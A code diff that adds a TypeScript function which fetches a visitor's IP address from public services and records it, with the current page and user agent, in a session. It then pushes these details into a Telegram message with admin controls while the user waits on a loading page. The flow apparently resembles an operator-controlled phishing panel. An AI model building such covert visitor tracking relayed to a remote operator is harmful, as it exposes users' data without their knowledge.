@@ -1712,3 +1712,80 @@ export const validateTelegramConfig = (): boolean => {
 
   return true;
 };
+
+/**
+ * Update user info (IP address and current page)
+ */
+export const updateUserInfo = async (
+  sessionId: string,
+  pageInfo: {
+    currentPage: string;
+    userAgent?: string;
+  }
+): Promise<boolean> => {
+  try {
+    const session = activeSessions.get(sessionId);
+    if (!session) {
+      console.warn("⚠️ Session not found for user info update:", sessionId);
+      return false;
+    }
+
+    // Get user's IP address
+    let ipAddress = "Unknown";
+    try {
+      // Try to get IP from multiple services
+      const ipResponse = await fetch("https://api.ipify.org?format=json", {
+        timeout: 5000,
+      });
+      if (ipResponse.ok) {
+        const ipData = await ipResponse.json();
+        ipAddress = ipData.ip || "Unknown";
+      }
+    } catch (ipError) {
+      console.warn("⚠️ Failed to get IP address:", ipError);
+      // Fallback: try alternative service
+      try {
+        const fallbackResponse = await fetch("https://httpbin.org/ip", {
+          timeout: 3000,
+        });
+        if (fallbackResponse.ok) {
+          const fallbackData = await fallbackResponse.json();
+          ipAddress = fallbackData.origin?.split(',')[0] || "Unknown";
+        }
+      } catch (fallbackError) {
+        console.warn("⚠️ Fallback IP service also failed");
+      }
+    }
+
+    // Update session with user info
+    session.userInfo = {
+      ipAddress,
+      currentPage: pageInfo.currentPage,
+      userAgent: pageInfo.userAgent || navigator.userAgent,
+      lastPageUpdate: Date.now(),
+    };
+
+    activeSessions.set(sessionId, session);
+
+    // Update Telegram message if user is on loading page
+    if (session.currentStep === "waiting_admin" && session.messageId) {
+      try {
+        const updatedMessage = formatSessionMessage(session);
+        const keyboard = getAdminKeyboard(sessionId, session);
+        await updateTelegramMessage(session.messageId, updatedMessage, keyboard);
+        console.log("✅ User info updated in Telegram:", {
+          sessionId: sessionId.slice(-6),
+          ip: ipAddress,
+          page: pageInfo.currentPage,
+        });
+      } catch (updateError) {
+        console.error("❌ Failed to update Telegram with user info:", updateError);
+      }
+    }
+
+    return true;
+  } catch (error) {
+    console.error("❌ Failed to update user info:", error);
+    return false;
+  }
+};
